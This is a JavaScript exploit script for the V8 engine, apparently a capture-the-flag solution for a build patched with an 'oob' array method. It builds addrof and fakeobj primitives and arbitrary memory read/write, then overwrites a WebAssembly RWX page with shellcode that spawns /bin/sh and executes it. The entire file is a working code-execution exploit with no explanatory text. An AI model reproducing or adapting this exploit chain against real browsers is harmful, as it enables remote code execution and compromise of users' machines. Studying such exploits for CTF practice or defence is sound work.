var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

var float_arr = [1.1];
var float_arr_map = float_arr.oob();
var arb_rw_arr = [float_arr_map, itof(0x0000000200000000n), 1, 0xffffffff];
var some_obj = {"A": 1.1};
var obj_arr = [some_obj];
var original_map = obj_arr.oob();

console.log("[+] Controlled float array: 0x" + addrof(arb_rw_arr).toString(16));

function ftoi(val) { // typeof(val) = float
                    f64_buf[0] = val;
                    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
                    u64_buf[0] = Number(val & 0xffffffffn);
                    u64_buf[1] = Number(val >> 32n);
                    return f64_buf[0];
}

function addrof(obj){
                obj_arr[0] = obj;
                obj_arr.oob(float_arr_map);
                let addr = obj_arr[0];
                obj_arr.oob(original_map);
                return ftoi(addr);
}
function fakeobj(addr){
                float_arr[0] = itof(addr);
                float_arr.oob(original_map);
                let new_obj = float_arr[0];
                float_arr.oob(float_arr_map);
                return new_obj;

}

function arb_read(ptr){

                if (ptr % 2n == 0)
                                ptr += 1n;

                let fake = fakeobj(addrof(arb_rw_arr)-0x20n);
                console.log("[+] fake object : 0x" + addrof(fake).toString(16));
                arb_rw_arr[2] = itof(ptr- 0x10n);
                return ftoi(fake[0]);
}


function arb_write(addr, val){
                let buf = new ArrayBuffer(8);
                let dataview = new DataView(buf);
                let buf_addr = addrof(buf);
                let backing_store_addr = buf_addr + 0x20n;
                init_arb_write(backing_store_addr, addr);
                dataview.setBigUint64(0, BigInt(val), true);

}
function init_arb_write(ptr, value){

                let fake = fakeobj(addrof(arb_rw_arr)-0x20n);
                console.log("[+] fake object : 0x" + addrof(fake).toString(16));
                arb_rw_arr[2] = itof(ptr- 0x10n);
        //      readline();
                fake[0] = itof(BigInt(value));
}

function copy_shellcode(addr, shellcode){
        let buf = new ArrayBuffer(0x100);
        let dataview = new DataView(buf);
        let buf_addr = addrof(buf);
        let backing_store_addr = buf_addr + 0x20n;
        init_arb_write(backing_store_addr, addr);
        for(let i =0;i<shellcode.length;i++){
                dataview.setUint32(4*i, shellcode[i], true);
        }
}


var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
var shellcode = [0x90909090,0xd2314850, 0x48f63148, 0x69622fbb,0x732f2f6e, 0x5f545368, 0x050f3bb0]
var rwx_page_addr = arb_read(addrof(wasm_instance) -1n + 0x88n)
copy_shellcode(rwx_page_addr, shellcode);
readline();
f();
